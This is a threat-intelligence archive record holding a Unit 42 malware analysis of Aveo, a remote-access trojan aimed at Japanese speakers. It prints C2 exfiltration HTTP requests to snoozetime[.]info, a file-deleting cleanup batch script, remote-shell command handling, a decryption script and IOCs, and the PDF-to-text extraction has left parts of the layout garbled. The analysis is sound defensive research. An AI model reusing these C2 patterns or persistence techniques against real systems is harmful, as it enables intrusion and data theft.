{
    "id": "854302d0-7bc9-4e5a-b707-374464df5bcb",
    "created_at": "2022-10-25T16:48:11.945746Z",
    "updated_at": "2025-03-27T02:06:11.854364Z",
    "deleted_at": null,
    "sha1_hash": "48fef28b947c6068d84cc19ce4148036da4543c7",
    "title": "Aveo Malware Family Targets Japanese Speaking Users - Palo Alto Networks BlogPalo Alto Networks Blog",
    "authors": "",
    "file_creation_date": "2016-08-17T21:29:57Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 478466,
    "plain_text": "### 7\n\n\n**FormerFirstRAT malware family, which was also witnessed being used against Japanese**\n\n**targets. Aveo is disguised as a Microsoft Excel document, and drops a decoy document upon**\n\n**execution. The decoy document in question is related to a research initiative led by the Ido**\n\n**Laboratory at the Saitama Institute of Technology. Upon execution, the Aveo malware accepts a**\n\n**number of commands, allowing attackers to take full control over the victim machine.**\n\n**The Aveo malware sample disguises itself as a Microsoft Excel document, as the icon below**\n\n**demonstrates. Note that the filename of ‘malware.exe’ is simply a placeholder, as the original**\n\n**filename is unknown.**\n\n**_Figure 1 Microsoft Excel icon used by Aveo malware_**\n\n**The executable is in fact a WinRAR self-extracting executable file, which will drop the decoy**\n\n**document and Aveo Trojan upon execution. The following decoy document is dropped and**\n\n**subsequently opened when run.**\n\n|Col1|POSTED BY: Josh Grunzweig and Robert Falcone on August 16, 2016 11:00 PM|\n|---|---|\n|7||\n|LLiikkee|FILED IN: Malware, Threat Prevention, Unit 42 TAGGED: Aveo, FormerFirstRAT, Ido Laboratory, microsoft, snoozetime Palo Alto Networks has identified a malware family known as ‘Aveo’ that is being used to target Japanese speaking users. The ‘Aveo’ malware name comes from an embedded debug string within the binary file. The Aveo malware family has close ties to the previously discussed|\n|Tweet||\n|1||\n\n\n**Get Updates**\n**Sign up to receive the latest news, cyber**\n**threat intelligence and research from Unit**\n**42.**\n\n**Business Email**\n\n**Submit**\n\n\n## 1\n\n\n-----\n\n**names, affiliations, and email addresses of those involved. The document, written in Japanese,**\n\n**as well as the filename of this document, “CAVE研究[会参加者].xls”, indicates that this malware**\n\n**was used to target one or more Japanese speaking individuals. Additionally, the similarities**\n\n**between the Aveo and FormerFirstRAT malware families, which will be discussed later in the**\n\n**post, further add evidence that Japanese speakers are being targeted.**\n\n**The Aveo Trojan is configured to communicate with the following domain name over HTTP.**\n\n**snoozetime[.]info**\n\n**This domain was first registered in May 2015 to ‘jack.ondo@mail.com’. Since that time, it has**\n\n**since been associated with the following three IP addresses:**\n\n**104.202.173[.]82**\n\n**107.180.36[.]179**\n\n**50.63.202[.]38**\n\n**All IP addresses in question are located within the United States.**\n\n**_Figure 3 PassiveTotal screenshot showing associated IP addresses with snoozetime[.]info_**\n\n**The WHOIS information for snoozetime[.]info lists a registrant email address of**\n\n**‘jack.ondo@mail[.]com’ and a name of ‘aygt5ruhrj aygt5ruhrj gerhjrt’. Pivoting off of these two**\n\n**pieces of information to domains that share the same yields the following additional domains**\n\n**and email addresses.**\n\n**bluepaint[.]info**\n\n**coinpack[.]info**\n\n**7b7p[.]info**\n\n**donkeyhaws[.]info**\n\n**europcubit[.]com**\n\n**jhmiyh.ny@gmail[.]com**\n\n**844148030@qq[.]com**\n\n**After running the self-extracting executable, a number of files are dropped to the file system and**\n\n**the following execution flow is witnessed:**\n\n**_Figure 4 Malware execution flow_**\n\n**When the mshelp32.exe executable runs, it begins by reading in the setting32.ini file, which**\n\n**contains the name of the decoy document. This information is used to build a batch script, such**\n\n**as the following.**\n\n\n-----\n\n**4**\n**5**\n**6**\n**7**\n\n\n**研究** **Q**\n**del mshelp32.exe /F /Q**\n**del setting32.ini /F /Q**\n**del** **\"C:\\Documents and Settings\\Administrator\\Desktop\\8101c298a33d91a**\n**del %0 /F /Q**\n\n\n**This batch script is executed within a new process, and acts as a simple cleanup script that runs**\n\n**after Aveo and the decoy document are executed.**\n\n**The Aveo malware initially runs an install routine, which will copy itself to the following location:**\n\n**%APPDATA%\\MMC\\MMC.exe**\n\n**If for any reason the %APPDATA%\\MMC directory is unable to be created, Aveo will use**\n\n**%TEMP% instead of %APPDATA%.**\n\n**After the malware copies itself, it will execute MMC.exe in a new process with an argument of**\n\n**the original filename. When executed, if this single argument is provided, the malware will**\n\n**delete the file path provided.**\n\n**After the installation routine completes, Aveo will exfiltrate the following victim information to a**\n\n**remote server via HTTP.**\n\n**Unique victim hash**\n\n**IP Address**\n\n**Microsoft Windows version**\n\n**Username**\n\n**ANSI code page identifier**\n\n**This information is exfiltrated to the ‘snoozetime[.]info’ domain, as seen in the following example**\n\n**HTTP request:**\n\n\n**1**\n**2**\n**3**\n**4**\n**5**\n\n\n**GET /index.php?id=35467&1=ySxlp03YGm0-&2=yiFi6hjbFHf9UtL44RPQ&4=zTZh**\n**Accept: */***\n**User-Agent: Mozilla/4.0** **(compatible;** **MSIE** **6.0;** **Windows NT** **5.0;** **.NET**\n**Host: snoozetime[.]info**\n**Cache-Control: no-cache**\n\n\n**To encrypt the provided data, the malware makes use of the RC4 algorithm, using a key of**\n\n**‘hello’. As shown in the following image, the encryption routines between Aveo and**\n\n**FormerFirstRAT are almost identical, with only the algorithms and keys being changed.**\n\n**_Figure 5 Comparison of encryption function between Aveo and FormerFirstRAT_**\n\n**In order to decrypt the data provided via HTTP, the following code may be used:**\n\n\n**1**\n**2**\n**3**\n**4**\n**5**\n**6**\n**7**\n**8**\n**9**\n**10**\n**11**\n**12**\n**13**\n**14**\n**15**\n**16**\n**17**\n**18**\n**19**\n\n\n**import base64**\n**from binascii import ***\n**from struct** **import ***\n**from wincrypto import CryptCreateHash,** **CryptHashData,** **CryptDeriveKe**\n\n**CALG_RC4 = 0x6801**\n**CALG_MD5 = 0x8003**\n\n**def decrypt(data):**\n**md5_hasher = CryptCreateHash(CALG_MD5)**\n**CryptHashData(md5_hasher,** **'hello')**\n**generated_key = CryptDeriveKey(md5_hasher,** **CALG_RC4)**\n**decrypted_data = CryptDecrypt(generated_key,** **data)**\n**return** **decrypted_data**\n\n**for** **a** **in** **'index.php?id=35467&1=niBo9x/bFG4-&2=yi9i6hjbAmD5TNPu5A--&**\n**k,v = a.split(\"=\")**\n**decrypted = decrypt(base64.b64decode(v.replace(\"-\",\"=\")))**\n**print** **\"[+] Parameter {} Decrypted: {}\".format(k,** **decrypted)**\n\n\n**Running the code above yields the following results:**\n\n\n-----\n\n**4**\n**5**\n\n\n\n**[ ]** **yp**\n\n**[+]** **Parameter** **5** **Decrypted: Josh Grunzweig**\n\n**[+]** **Parameter** **6** **Decrypted: 1252**\n\n\n**After the initial victim information is exfiltrated, the malware expects a response of ‘OK’.**\n\n**Afterwards, Aveo will spawn a new thread that is responsible for handling interactive command**\n\n**requests received by the command and control (C2) server, as well as requests to spawn an**\n\n**interactive shell.**\n\n**Aveo proceeds to set the following registry key to point towards the malware’s path, thus**\n\n**ensuring persistence across reboots:**\n\n**_HKCU\\software\\microsoft\\windows\\currentversion\\run\\msnetbridge_**\n\n**A command handler loop is then entered, where Aveo will accept commands from the remote**\n\n**C2. While the Aveo malware family awaits a response, it will perform sleep delays of randomly**\n\n**chosen intervals between 0 and 3276 milliseconds. Should the C2 server respond with ‘toyota’,**\n\n**it will set that interval to 60 seconds. Aveo accepts the following commands, shown with their**\n\n**associated function.**\n\n**1 : Execute command in interactive shell**\n\n**2 : Get file attributes**\n\n**3 : Write file**\n\n**4 : Read file**\n\n**5 : List drives**\n\n**6 : Execute DIR command against path**\n\n**The following example request demonstrates the C2 server sending the ‘ipconfig’ command to**\n\n**the Aveo malware.**\n\n**C2 Request**\n\n\n**1**\n**2**\n**3**\n**4**\n**5**\n**6**\n**7**\n**8**\n**9**\n**10**\n**11**\n**12**\n**13**\n**14**\n**15**\n**16**\n\n\n**GET /index.php?id=35468&1=niBo9x/bFG4- HTTP/1.1**\n**Accept: */***\n**User-Agent: Mozilla/4.0** **(compatible;** **MSIE** **6.0;** **Windows NT** **5.0;** **.NET**\n**Host: snoozetime[.]info**\n**Cache-Control: no-cache**\n\n**HTTP/1.0** **200** **OK**\n**Content-Type: text/html;** **charset=utf-8**\n**Content-Length: 11**\n**Server: Werkzeug/0.11.10** **Python/2.7.5**\n**Date: Wed,** **10** **Aug** **2016** **16:00:11** **GMT**\n\n**\\xca89\\xb4J\\x82B?\\xa5\\x05\\xe8**\n\n**[Decrypted]**\n**1** **ipconfig**\n\n\n**Aveo Response**\n\n\n**1**\n**2**\n**3**\n**4**\n**5**\n**6**\n**7**\n**8**\n**9**\n**10**\n**11**\n**12**\n**13**\n**14**\n**15**\n**16**\n**17**\n**18**\n**19**\n**20**\n**21**\n\n\n**POST /index.php?id=35469&1=niBo9x/bFG4- HTTP/1.1**\n**Accept: */***\n**User-Agent: Mozilla/4.0** **(compatible;** **MSIE** **6.0;** **Windows NT** **5.0;** **.NET**\n**Host: snoozetime[.]info**\n**Content-Length: 1006**\n**Cache-Control: no-cache**\n\n**\\xca\\x38\\x39\\xb4\\x4a\\x82\\x42\\x3f\\xa5\\x05\\xe8\\xdb\\xda\\x74\\x8b\\x79\\x**\n\n**[Truncated]**\n\n**[Decrypted]**\n**1** **ipconfig**\n\n**Windows IP Configuration**\n\n**Ethernet adapter Bluetooth Network Connection:**\n\n**Media State** **.** **.** **.** **.** **.** **.** **.** **.** **.** **.** **. : Media disconnected**\n**Connection-specific DNS Suffix** **. :**\n\n**[Truncated]**\n\n\n**Aveo shares a number of characteristics with FormerFirstRAT, including encryption routines,**\n\n**code reuse, and similarities in C2 functionality. Aveo is far from the most sophisticated malware**\n\n**family around. As witnessed in the previously discussed FormerFirstRAT sample, this related**\n\n**malware family also looks to be targeting Japanese speaking users. Using a self-extracting**\n\n**WinRAR file, the malware drops a decoy document, a copy of the Aveo malware, and a cleanup**\n\n**script.**\n\n**Palo Alto Networks customers are protected from this threat in the following ways:**\n\n\n-----\n\n**p**\n\n**C2 domains listed in this report are blocked through Threat Prevention.**\n\n**SHA256 Hashes**\n\n**9dccfdd2a503ef8614189225bbbac11ee6027590c577afcaada7e042e18625e2**\n\n**8101c298a33d91a985a5150d0254cf426601e4632250f5a03ddac39375e7fb4d**\n\n**C2 Domains**\n\n**snoozetime[.]info**\n\n**Registry Keys**\n\n**HKCU\\software\\microsoft\\windows\\currentversion\\run\\msnetbridge**\n\n**File Paths**\n\n**%APPDATA%\\MMC\\MMC.exe**\n\n**%TEMP%\\MMC\\MMC.exe**\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2016/2016.08.16.aveo-malware-family-targets-japanese/unit42-aveo-malware-family-targets-japanese-speaking-users.pdf"
    ],
    "report_names": [
        "unit42-aveo-malware-family-targets-japanese-speaking-users"
    ],
    "threat_actors": [
        {
            "id": "7ebda3c6-1789-4d84-97cf-47fb18a0cb28",
            "created_at": "2022-10-25T15:50:23.78829Z",
            "updated_at": "2025-03-27T02:00:55.547275Z",
            "deleted_at": null,
            "main_name": "DragonOK",
            "aliases": [
                "DragonOK"
            ],
            "source_name": "MITRE:DragonOK",
            "tools": [
                "PoisonIvy",
                "PlugX"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "60d9c778-488b-459e-a2f6-9e48c607ba45",
            "created_at": "2022-10-25T16:47:55.606462Z",
            "updated_at": "2025-03-27T02:05:17.281676Z",
            "deleted_at": null,
            "main_name": "BRONZE OVERBROOK",
            "aliases": [
                "DragonOK ",
                "Samurai Panda ",
                "Temp.DragonOK ",
                "Danti "
            ],
            "source_name": "Secureworks:BRONZE OVERBROOK",
            "tools": [
                " DDKONG",
                " HelloBridge",
                " IsSpace",
                " NFLog Trojan",
                " PLAINTEE",
                " PlugX",
                " Rambo",
                "Aveo"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "340d1673-0678-4e1f-8b75-30da2f65cc80",
            "created_at": "2022-10-25T16:07:23.552036Z",
            "updated_at": "2025-03-27T02:02:09.85925Z",
            "deleted_at": null,
            "main_name": "DragonOK",
            "aliases": [
                "Bronze Overbrook",
                "Shallow Taurus"
            ],
            "source_name": "ETDA:DragonOK",
            "tools": [
                "Agent.dhwf",
                "CT",
                "Chymine",
                "Darkmoon",
                "Destroy RAT",
                "DestroyRAT",
                "FF-RAT",
                "FormerFirstRAT",
                "Gen:Trojan.Heur.PT",
                "HTran",
                "HUC Packet Transmit Tool",
                "HelloBridge",
                "IsSpace",
                "KHRAT",
                "Kaba",
                "Korplug",
                "Mongall",
                "NFlog",
                "NewCT",
                "NfLog RAT",
                "PlugX",
                "Poison Ivy",
                "Rambo",
                "RedDelta",
                "SPIVY",
                "Sogu",
                "SysGet",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "TidePool",
                "Xamtrav",
                "brebsd",
                "ffrat",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716491,
    "ts_updated_at": 1743041171,
    "ts_creation_date": 1471469397,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/48fef28b947c6068d84cc19ce4148036da4543c7.pdf",
        "text": "https://archive.orkl.eu/48fef28b947c6068d84cc19ce4148036da4543c7.txt",
        "img": "https://archive.orkl.eu/48fef28b947c6068d84cc19ce4148036da4543c7.jpg"
    }
}